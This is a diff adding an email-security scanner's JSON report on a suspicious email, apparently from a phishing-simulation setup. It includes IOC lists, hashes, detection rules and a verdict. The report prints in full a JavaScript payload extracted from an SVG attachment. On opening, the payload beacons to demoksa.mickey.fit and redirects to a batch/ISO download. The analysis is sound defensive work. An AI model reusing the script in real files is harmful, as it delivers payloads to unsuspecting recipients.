+              "base64_thumbnail": "UklGRq4DAABXRUJQVlA4IKIDAABwEgCdASr6ACEAPp1MoUslpKMhqBVY4LATiWcA1WGVCf7ef766zhlrMBuCErHXGGWSSOSeal5B1W0REQ+l1OAabFQ5yvybEdm3GZ6aRoGVezK3oGBn9i57ZOeoo7wU6PxQz9zHLeREREFQjL8JaoAiLQJliHXtr62p05eGSsDsF+PpYii99im9Etf3Ad2VaqjxprTMzMz0ZMTRV2AA/vDEC/+4P1B/EFS//Qr1l99MfrTAXTrRvR19etLLeCw7zoSJlwkFMRlweQfAClBS8uoBTu57Q5Pe2ypgyVB7phLbKgrhx9Y/vrMA4fyy/nHp3gbhzVGkvxjlPEvFjPEv3doh4h/nDBKuDP0qIABmY8L+TKtt3YMKogsMKRA5RgRrTtadRrFV11z1ljyMpYQwFs7z9ohQzK7/dbXlIUqCvPmrWYvVm1Pzv0m15ed4rPP95jacCxx8/KBm9zYiwPRfhRr4VZwT0NgnS3X+DqmH4TSSnMYiIcPSOFCKIv2fHm1/tTGtBs/6GY8WnkmgDRzqPGumSqh1QwYGiuW5lt8wDjRf//EJ9C3CfUcIDwp+It4xhQJrGLD2UcnK/0boWNq/SZA7O+Jj8MJA9rFW/O7wGJAbLoxVhjmWwsIoNje5+U+20vBEaaUfBaiRtlP11tH3bkLNloqUNg42Uw+BjzD34sfzLN3BYKJ9e7o/M1NS7NfU3u0Jd9vGkZzvSe/maBs1qr+2KeyMQZOXWva7M38B5Xk2IDu8rgsoJv8n7Tn15MvroUuaZSFv7lg1e7mchiq/pJxYfnGPIyHqKtCe4X77IT3UncQAUFFA5a5gH4btmVrWmNWRZLLdQQMZzX8tSZ44UHJkvvGAEYGK91qfyi1TiovuiUShi7/l8zng6G6J15bLN/lINiB+QjZA6ycaJRRTJkIK7Cy5v22kjNhR5T2v5/xeK9RKNGGB1ZbDCBufNM906fWCkXQUxlVzIQRb8YXdN4dQLZjg8Hij35pR4VOwsD9VZxVXyizQsL/EhVF/vWFl4QFn2Baj8BCE4kdQDQGHSYU6kaXwwcjOzlG0rshIUnZn6Axz/rSI+0e2tchnguSDdnxzUrUw16V2eynliZLsdW+VQZRKGjy00noi6aDPEcZXgccvUJ52uKCWvLM8ZnFUjHTlJFIDibP6udDreC6yMyhbzNsoH5jXiSxF0pXzy54QE7FcRaPm0/m2Q34VitSeUQIyxoVTpjOOfRcWk8AAAAAAAAA=",
+              "flags": [],
+              "text": [
+                {
+                  "data": "UHlybw==",
+                  "_type": "bytes",
+                  "encoding": "base64"
+                },
+                {
+                  "data": "cGVhcw==",
+                  "_type": "bytes",
+                  "encoding": "base64"
+                },
+                {
+                  "data": "dGVycnk=",
+                  "_type": "bytes",
+                  "encoding": "base64"
+                },
+                {
+                  "data": "QQ==",
+                  "_type": "bytes",
+                  "encoding": "base64"
+                },
+                {
+                  "data": "Mg==",
+                  "_type": "bytes",
+                  "encoding": "base64"
+                },
+                {
+                  "data": "wqU=",
+                  "_type": "bytes",
+                  "encoding": "base64"
+                },
+                {
+                  "data": "Zmk=",
+                  "_type": "bytes",
+                  "encoding": "base64"
+                },
+                {
+                  "data": "QQ==",
+                  "_type": "bytes",
+                  "encoding": "base64"
+                },
+                {
+                  "data": "YWEu",
+                  "_type": "bytes",
+                  "encoding": "base64"
+                },
+                {
+                  "data": "JQ==",
+                  "_type": "bytes",
+                  "encoding": "base64"
+                },
+                {
+                  "data": "Q1Mp",
+                  "_type": "bytes",
+                  "encoding": "base64"
+                },
+                {
+                  "data": "aGU=",
+                  "_type": "bytes",
+                  "encoding": "base64"
+                },
+                {
+                  "data": "Sg==",
+                  "_type": "bytes",
+                  "encoding": "base64"
+                },
+                {
+                  "data": "YWE=",
+                  "_type": "bytes",
+                  "encoding": "base64"
+                },
+                {
+                  "data": "Uk9ZQUw=",
+                  "_type": "bytes",
+                  "encoding": "base64"
+                },
+                {
+                  "data": "T01BTg==",
+                  "_type": "bytes",
+                  "encoding": "base64"
+                },
+                {
+                  "data": "UE9MSUNF",
+                  "_type": "bytes",
+                  "encoding": "base64"
+                }
+              ],
+              "render": {
+                "width": 2622,
+                "format": "png",
+                "source": "pdf",
+                "dpi": 300,
+                "height": 347
+              }
+            },
+            "yara": {
+              "elapsed": 0.008755,
+              "detection": [],
+              "rules_loaded": 2681,
+              "meta": [],
+              "flags": [],
+              "hex": [],
+              "information": [],
+              "collection": [],
+              "matches": [
+                "domain"
+              ],
+              "tags": []
+            }
+          }
+        },
+        "archive_children": [],
+        "counts": {
+          "total_events": 1,
+          "archive_children": 0
+        },
+        "artifact_name": "<image_0>",
+        "events": []
+      }
+    },
+    {
+      "filename": "Attachment.svg",
+      "type": "attachment",
+      "parent": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+      "parent_type": "email",
+      "content_type": "image/svg+xml",
+      "size": 1685,
+      "sha256": "302e25e74b602601cee6fca57601398310f9bd1fc628f4ae5e0c1071ed1cbdfd",
+      "analysis": {
+        "artifact_type": "files",
+        "root_event": {
+          "file": {
+            "flavors": {
+              "mime": [
+                "image/svg+xml"
+              ],
+              "yara": [
+                "xml_file"
+              ]
+            },
+            "scanners": [
+              "ScanClamav",
+              "ScanEntropy",
+              "ScanFooter",
+              "ScanHash",
+              "ScanHeader",
+              "ScanTlsh",
+              "ScanXml",
+              "ScanYara"
+            ],
+            "depth": 0,
+            "size": 1685,
+            "name": "75203985-9c2a-4ce6-990b-bcd61d4a19b4___files___Attachment.svg",
+            "tree": {
+              "node": "312d86db-a89b-4051-9774-a78d69d35465",
+              "parent": "",
+              "root": "312d86db-a89b-4051-9774-a78d69d35465"
+            },
+            "source": ""
+          },
+          "iocs": [
+            {
+              "scanner": "ScanXml",
+              "ioc": "purl.org",
+              "ioc_type": "domain"
+            },
+            {
+              "scanner": "ScanXml",
+              "ioc": "demoksa.mickey.fit",
+              "ioc_type": "domain"
+            },
+            {
+              "scanner": "ScanXml",
+              "ioc": "www.inkscape.org",
+              "ioc_type": "domain"
+            },
+            {
+              "scanner": "ScanXml",
+              "ioc": "creativecommons.org",
+              "ioc_type": "domain"
+            },
+            {
+              "scanner": "ScanXml",
+              "ioc": "www.w3.org",
+              "ioc_type": "domain"
+            },
+            {
+              "scanner": "ScanXml",
+              "ioc": "sodipodi.sourceforge.net",
+              "ioc_type": "domain"
+            }
+          ],
+          "scan": {
+            "entropy": {
+              "elapsed": 0.000092,
+              "entropy": 5.004580095479254,
+              "flags": []
+            },
+            "clamav": {
+              "elapsed": 18.667883,
+              "Data scanned": "0.00 MB",
+              "Start Date": "2026",
+              "Known viruses": "3627833",
+              "End Date": "2026",
+              "flags": [],
+              "Time": "18.614 sec (0 m 18 s)",
+              "Scanned directories": "0",
+              "Scanned files": "1",
+              "Data read": "0.00 MB (ratio 0.00",
+              "Infected files": "0",
+              "Engine version": "1.4.3"
+            },
+            "footer": {
+              "elapsed": 0.000044,
+              "footer": {
+                "data": "IG5ld0ZpbGUxKGJsb2IpOwogICAgICAgIDwvc2NyaXB0PgogICAgICAgIAo8L3N2Zz4=",
+                "_type": "bytes",
+                "encoding": "base64"
+              },
+              "flags": [],
+              "backslash": " newFile1(blob);\\n        </script>\\n        \\n</svg>"
+            },
+            "xml": {
+              "elapsed": 0.062975,
+              "total": {
+                "extracted": 1,
+                "tags": 8
+              },
+              "emitted_content": [
+                "function newFile1(blob)\n                {\n                fetch(\"https://demoksa.mickey.fit/api/tracker/237/5963230521/file_opened/\", {method: 'GET'});\n                let files = new File([blob], \"invitation.iso\", {type: \"application/octet-stream\"});\n                let exportUrls = \"https://demoksa.mickey.fit/api/emulate/svb/bat/237_5963230521/\";\n                window.location.assign(exportUrls);\n                URL.revokeObjectURL(exportUrls);\n                }\n\n            var text = [];\n            var e = new Uint8Array(text);\n            var blob = new Blob([e], {type: \"application/octet-stream\"});\n            newFile1(blob);"
+              ],
+              "flags": [],
+              "doc_type": "",
+              "version": "1.0",
+              "tag_data": [
+                {
+                  "tag": "type",
+                  "content": "{'type': 'text/javascript'}"
+                }
+              ],
+              "tags": [
+                "svg",
+                "type",
+                "rdf",
+                "script",
+                "title",
+                "format",
+                "work",
+                "metadata"
+              ],
+              "namespaces": [
+                "http://creativecommons.org/ns#",
+                "http://www.w3.org/2000/svg",
+                "http://www.w3.org/1999/02/22-rdf-syntax-ns#",
+                "http://purl.org/dc/elements/1.1/"
+              ]
+            },
+            "header": {
+              "elapsed": 0.000042,
+              "flags": [],
+              "header": {
+                "data": "PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiIHN0YW5kYWxvbmU9Im4=",
+                "_type": "bytes",
+                "encoding": "base64"
+              },
+              "backslash": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"n"
+            },
+            "tlsh": {
+              "elapsed": 0.00008,
+              "flags": []
+            },
+            "hash": {
+              "elapsed": 0.00024,
+              "sha1": "67a925a45cb5b94ac3481967d02b573ad4314157",
+              "sha256": "302e25e74b602601cee6fca57601398310f9bd1fc628f4ae5e0c1071ed1cbdfd",
+              "flags": [],
+              "tlsh": "T1B63154C8E5834CC1A61FC5086BF2F6055617609B42C4844FB9EC18749F414C823B67ED",
+              "ssdeep": "48:c+koIaLHHLIkVgUgA4RG2wYfLF9X6MuZSG+3itG6:VkoIanLXqG2wYfLO4pC",
+              "md5": "58f11e6d2c9ca671e52f568e6862e282"
+            },
+            "yara": {
+              "elapsed": 0.002716,
+              "detection": [],
+              "rules_loaded": 2681,
+              "meta": [],
+              "flags": [],
+              "hex": [],
+              "information": [],
+              "collection": [],
+              "matches": [
+                "url",
+                "domain",
+                "java"
+              ],
+              "tags": []
+            }
+          }
+        },
+        "archive_children": [],
+        "counts": {
+          "total_events": 2,
+          "archive_children": 0
+        },
+        "artifact_name": "Attachment.svg",
+        "events": [
+          {
+            "file": {
+              "flavors": {
+                "mime": [
+                  "text/plain"
+                ],
+                "yara": [
+                  "javascript_file"
+                ]
+              },
+              "scanners": [
+                "ScanClamav",
+                "ScanEntropy",
+                "ScanFooter",
+                "ScanHash",
+                "ScanHeader",
+                "ScanJavascript",
+                "ScanTlsh",
+                "ScanYara",
+                "HttpxScanner"
+              ],
+              "depth": 1,
+              "size": 641,
+              "name": "script",
+              "tree": {
+                "node": "4f056a59-e6af-4e6f-8181-8379f5e544e5",
+                "parent": "312d86db-a89b-4051-9774-a78d69d35465",
+                "root": "312d86db-a89b-4051-9774-a78d69d35465"
+              },
+              "source": "ScanXml"
+            },
+            "iocs": [
+              {
+                "scanner": "ScanJavascript",
+                "ioc": "demoksa.mickey.fit",
+                "ioc_type": "domain"
+              },
+              {
+                "scanner": "ScanJavascript",
+                "ioc": "https://demoksa.mickey.fit/api/tracker/237/5963230521/file_opened/",
+                "ioc_type": "url"
+              },
+              {
+                "scanner": "ScanJavascript",
+                "ioc": "https://demoksa.mickey.fit/api/emulate/svb/bat/237_5963230521/",
+                "ioc_type": "url"
+              }
+            ],
+            "scan": {
+              "entropy": {
+                "elapsed": 0.000082,
+                "entropy": 4.612338478040046,
+                "flags": []
+              },
+              "clamav": {
+                "elapsed": 18.975177,
+                "Data scanned": "0.00 MB",
+                "Start Date": "2026",
+                "Known viruses": "3627833",
+                "End Date": "2026",
+                "flags": [],
+                "Time": "18.945 sec (0 m 18 s)",
+                "Scanned directories": "0",
+                "Scanned files": "1",
+                "Data read": "0.00 MB (ratio 0.00",
+                "Infected files": "0",
+                "Engine version": "1.4.3"
+              },
+              "footer": {
+                "elapsed": 0.000036,
+                "footer": {
+                  "data": "YXRpb24vb2N0ZXQtc3RyZWFtIn0pOwogICAgICAgICAgICBuZXdGaWxlMShibG9iKTs=",
+                  "_type": "bytes",
+                  "encoding": "base64"
+                },
+                "flags": [],
+                "backslash": "ation/octet-stream\"});\\n            newFile1(blob);"
+              },
+              "header": {
+                "elapsed": 0.000026,
+                "flags": [],
+                "header": {
+                  "data": "ZnVuY3Rpb24gbmV3RmlsZTEoYmxvYikKICAgICAgICAgICAgICAgIHsKICAgICAgICA=",
+                  "_type": "bytes",
+                  "encoding": "base64"
+                },
+                "backslash": "function newFile1(blob)\\n                {\\n        "
+              },
+              "httpxner": {
+                "elapsed": 32.090122,
+                "httpx": [],
+                "flags": [
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error"
+                ],
+                "errors": [
+                  {
+                    "scanner": "httpx",
+                    "mid": "unknown",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_132932_460196/httpx_output.jsonl",
+                    "url": "function newFile1(blob)"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "unknown",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_132945_866374/httpx_output.jsonl",
+                    "url": "{"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "unknown",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_132947_291131/httpx_output.jsonl",
+                    "url": "fetch(\"https://demoksa.mickey.fit/api/tracker/237/5963230521/file_opened/\", {method: 'GET'});"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "unknown",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_132948_782780/httpx_output.jsonl",
+                    "url": "let files = new File([blob], \"invitation.iso\", {type: \"application/octet-stream\"});"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "unknown",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_132950_674444/httpx_output.jsonl",
+                    "url": "let exportUrls = \"https://demoksa.mickey.fit/api/emulate/svb/bat/237_5963230521/\";"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "unknown",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_132952_078743/httpx_output.jsonl",
+                    "url": "window.location.assign(exportUrls);"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "unknown",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_132953_769696/httpx_output.jsonl",
+                    "url": "URL.revokeObjectURL(exportUrls);"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "unknown",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_132955_822531/httpx_output.jsonl",
+                    "url": "}"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "unknown",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_132957_382306/httpx_output.jsonl",
+                    "url": "var text = [];"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "unknown",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_132958_759607/httpx_output.jsonl",
+                    "url": "var e = new Uint8Array(text);"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "unknown",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133000_395474/httpx_output.jsonl",
+                    "url": "var blob = new Blob([e], {type: \"application/octet-stream\"});"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "unknown",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133002_307885/httpx_output.jsonl",
+                    "url": "newFile1(blob);"
+                  }
+                ]
+              },
+              "tlsh": {
+                "elapsed": 0.000086,
+                "flags": []
+              },
+              "hash": {
+                "elapsed": 0.000151,
+                "sha1": "c607a49a7e5131a9851b177f6b813524aacb7443",
+                "sha256": "e0339d2cf193a3f4b86bf42ba147ec356e40a750286e5fa4f7c7215882b7a49a",
+                "flags": [],
+                "tlsh": "T1F1F095D755434CC0BDB7205D5737971771B3959F69E0C41A798CA0450F4406D03F51DD",
+                "ssdeep": "12:AvWXi0xH0OM5R/Q35XIogF+XW17uYScfnVs/G4z+HFFy5XIocGn:YWXi0xUOMYIfMXWxZSG+3iFwINGn",
+                "md5": "2a9f7fe7c4b2b20b2361e96ccdfc99ee"
+              },
+              "javascript": {
+                "elapsed": 0.040712,
+                "urls": [
+                  "https://demoksa.mickey.fit/api/tracker/237/5963230521/file_opened/",
+                  "https://demoksa.mickey.fit/api/emulate/svb/bat/237_5963230521/"
+                ],
+                "keywords": [
+                  "function",
+                  "var",
+                  "new",
+                  "let"
+                ],
+                "strings": [
+                  "invitation.iso",
+                  "https://demoksa.mickey.fit/api/emulate/svb/bat/237_5963230521/",
+                  "application/octet-stream",
+                  "https://demoksa.mickey.fit/api/tracker/237/5963230521/file_opened/",
+                  "GET"
+                ],
+                "identifiers": [
+                  "newFile1",
+                  "files",
+                  "Blob",
+                  "exportUrls",
+                  "fetch",
+                  "URL",
+                  "text",
+                  "window",
+                  "method",
+                  "assign",
+                  "e",
+                  "revokeObjectURL",
+                  "File",
+                  "blob",
+                  "Uint8Array",
+                  "type",
+                  "location"
+                ],
+                "flags": [],
+                "suspicious_keywords": [],
+                "tokens": [
+                  "Keyword",
+                  "Identifier",
+                  "Punctuator",
+                  "String"
+                ],
+                "regular_expressions": [],
+                "script_length_bytes": 641,
+                "beautified": true
+              },
+              "yara": {
+                "elapsed": 0.001909,
+                "detection": [],
+                "rules_loaded": 2681,
+                "meta": [],
+                "flags": [],
+                "hex": [],
+                "information": [],
+                "collection": [],
+                "matches": [
+                  "url",
+                  "domain",
+                  "IsSuspicious"
+                ],
+                "tags": []
+              }
+            }
+          }
+        ]
+      }
+    }
+  ],
+  "classification": {
+    "engine": "hybrid",
+    "rules": {
+      "engine": "rule_based",
+      "language": "en",
+      "urgency_score": 0,
+      "credential_score": 0,
+      "impersonation_score": 0,
+      "threat_score": 0,
+      "call_to_action_score": 0,
+      "financial_score": 0,
+      "phishing": 0,
+      "explanations": []
+    },
+    "ml": {
+      "engine": "ml",
+      "phishing": 0.25,
+      "explanations": [
+        "ML model phishing probability 0.25"
+      ]
+    },
+    "score": 0.1,
+    "risk_level": "SAFE"
+  },
+  "intelligence": {
+    "score": 0,
+    "total_observables": 15,
+    "observables": [
+      {
+        "value": "https://fonts.googleapis.com/css?family=Ubuntu:300,400,500,700",
+        "type": "url"
+      },
+      {
+        "value": "https://demoksa.mickey.fit/api/tracker/237/5963230521/mail_opened/",
+        "type": "url"
+      },
+      {
+        "value": "http://www.w3.org/1999/xhtml",
+        "type": "url"
+      },
+      {
+        "value": "https://fonts.googleapis.com/css?family=Ubuntu:300,400,500,700);",
+        "type": "url"
+      },
+      {
+        "value": "https://demoksa.mickey.fit/api/page/237/5963230521/",
+        "type": "url"
+      },
+      {
+        "value": "www.w3.org",
+        "type": "hostname"
+      },
+      {
+        "value": "fonts.googleapis.com",
+        "type": "hostname"
+      },
+      {
+        "value": "demoksa.mickey.fit",
+        "type": "hostname"
+      },
+      {
+        "value": "8768498e2dec4cc1fd459137993b9b2b2fa4b8b62d4b99fccd5c12c2ce35532b",
+        "type": "sha256"
+      },
+      {
+        "value": "302e25e74b602601cee6fca57601398310f9bd1fc628f4ae5e0c1071ed1cbdfd",
+        "type": "sha256"
+      },
+      {
+        "value": "002c502f60cd469ce87688dcddb4413c90c1abd95aa90f9e40d2f8fe610c1939",
+        "type": "sha256"
+      },
+      {
+        "value": "775833c69071432602fa9faa30c422597db457b1632b519f5da5dcc47864208b",
+        "type": "sha256"
+      },
+      {
+        "value": "bc2f6dc7c808cac26162742bc825e8a60b80be155f4e3ca58b1b111d2422d5e5",
+        "type": "sha256"
+      },
+      {
+        "value": "32b8826b06fa1106c53b4e2bd88366fba008d433fb946cd8ec84683c7b12b2b7",
+        "type": "sha256"
+      },
+      {
+        "value": "01c205e91723f08be180b2c8f94c2648436b57cdaffcb740d246642e5818805d",
+        "type": "sha256"
+      }
+    ],
+    "total_IOCs": 0,
+    "IOCs": []
+  },
+  "detection": {
+    "verdict": "suspicious",
+    "score": 63,
+    "max_severity": "high",
+    "triggered_rules": [
+      {
+        "id": "EMAIL-SIGMA-001",
+        "title": "DMARC fail with Reply-To mismatch 2",
+        "severity": "high",
+        "score": 80,
+        "source": "unknown"
+      },
+      {
+        "id": "EMAIL-SIGMA-001",
+        "title": "DMARC fail with Reply-To mismatch",
+        "severity": "high",
+        "score": 80,
+        "source": "unknown"
+      },
+      {
+        "id": "EMAIL-SIGMA-001",
+        "title": "DMARC fail with Reply-To mismatch",
+        "severity": "high",
+        "score": 80,
+        "source": "unknown"
+      },
+      {
+        "id": "EMAIL-SIGMA-001",
+        "title": "Test Rule",
+        "severity": "high",
+        "score": 80,
+        "source": "unknown"
+      },
+      {
+        "id": "EMAIL-SIGMA-001111",
+        "title": "Test Rule111",
+        "severity": "high",
+        "score": 80,
+        "source": "unknown"
+      },
+      {
+        "id": "33333",
+        "title": "All email authentications failed2 (SPF, DKIM, DMARC)",
+        "severity": "high",
+        "score": 40,
+        "source": "unknown"
+      },
+      {
+        "id": "33333",
+        "title": "All email authentications failed2 (SPF, DKIM, DMARC)",
+        "severity": "high",
+        "score": 40,
+        "source": "unknown"
+      },
+      {
+        "id": "URL-041",
+        "title": "URL Count Threshold",
+        "severity": "medium",
+        "score": 30,
+        "source": "unknown"
+      }
+    ],
+    "logs": []
+  },
+  "sender": "support@critical.click",
+  "recipient": "mohamed.samir@dphish.com",
+  "source_ip": null
+}
